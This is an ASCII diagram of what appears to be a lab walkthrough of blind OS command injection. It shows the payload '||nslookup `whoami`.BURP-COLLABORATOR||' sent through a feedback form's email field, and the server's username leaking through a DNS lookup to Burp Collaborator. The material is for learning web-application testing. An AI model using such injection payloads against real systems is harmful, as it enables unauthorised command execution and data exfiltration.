```text
================================================================================
       THE FLOW: BLIND OS COMMAND INJECTION + OOB DATA EXFILTRATION
================================================================================

┌──────────────────┐     ┌──────────────────────┐     ┌──────────────────────┐
│      YOU         │     │    WEB APPLICATION   │     │      WEB SERVER      │
│                  │     │                      │     │                      │
│ Open Feedback    │────►│ Feedback function    │────►│ Receives the         │
│ page             │     │                      │     │ submitted email      │
│                  │     │ User input is used   │     │ parameter            │
│ Capture request  │     │ inside a shell       │     │                      │
│ in Burp Suite    │     │ command              │     │ Command executes     │
│                  │     │                      │     │ asynchronously       │
│ Get a unique     │     │ HTTP response does   │     │                      │
│ Collaborator     │     │ not contain command  │     │ Executes:            │
│ subdomain        │     │ output               │     │                      │
│                  │     │                      │     │ whoami               │
│ Inject:          │     │                      │     │                      │
│                  │     │                      │     │ Output is placed     │
│ ||nslookup       │     │                      │     │ into the DNS name    │
│ `whoami`.BURP-   │     │                      │     │ being looked up      │
│ COLLABORATOR||   │     │                      │     │                      │
└──────────────────┘     └──────────────────────┘     └──────────┬───────────┘
                                                                 │
                                                                 │ DNS query
                                                                 ▼
                                                    ┌─────────────────────────┐
                                                    │   BURP COLLABORATOR     │
                                                    │                         │
                                                    │ Receives DNS interaction│
                                                    │                         │
                                                    │ Requested hostname      │
                                                    │ contains the output of  │
                                                    │ `whoami`                │
                                                    │                         │
                                                    │        ✔ DATA           │
                                                    │        EXFILTRATED      │
                                                    └────────────┬────────────┘
                                                                 │
                                                                 │ Inspect DNS
                                                                 │ interaction
                                                                 ▼
                                                          ┌──────────────┐
                                                          │     YOU      │
                                                          │              │
                                                          │ Read current │
                                                          │ username from│
                                                          │ Collaborator │
                                                          │ interaction  │
                                                          │              │
                                                          │      ✔       │
                                                          └──────────────┘

================================================================================
                         WHAT THE SCREENSHOT SHOWS
================================================================================


┌────────────────────────────┐
│       COLLABORATOR         │
│         POLLING            │
│                            │
│  #   Time       Type       │
│  ────────────────────────  │
│  1   01:17:43   DNS        │
│  2   01:17:43   DNS        │
│  3   01:18:56   DNS  ←     │
│  4   01:18:56   DNS        │
└──────────────┬─────────────┘
               │
               │ Select interaction
               ▼
┌────────────────────────────────────────────────────────────┐
│                         DESCRIPTION                        │
│                                                            │
│ Collaborator received a DNS lookup of type A for:          │
│                                                            │
│ peter-tZXgy0.bt82fvhfm8v8bcfri5e1gp72itojc8                │
│ .burpcollaborator.net                                      │
│                                                            │
│ Lookup received from IP:                                   │
│ 34.245.205.175                                             │
└────────────────────────────────────────────────────────────┘
================================================================================
```